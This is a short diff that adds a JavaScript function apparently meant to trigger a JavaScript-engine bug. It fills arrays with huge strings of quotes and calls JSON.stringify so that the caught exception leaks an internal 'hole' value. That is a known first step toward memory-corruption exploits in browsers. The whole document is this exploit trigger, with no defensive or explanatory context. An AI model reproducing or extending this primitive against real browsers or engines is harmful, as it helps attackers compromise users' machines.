@@ -1,0 +1,12 @@
+function trigger() {  
+    let a = [], b = [];  
+    let s = '"'.repeat(0x800000);  
+    a[20000] = s;  
+    for (let i = 0; i < 10; i++) 
+       a[i] = s;  
+    for (let i = 0; i < 10; i++) 
+       b[i] = a;  
+    try {  
+        JSON.stringify(b);  
+    } catch (hole) {  return hole;  }  
+}  
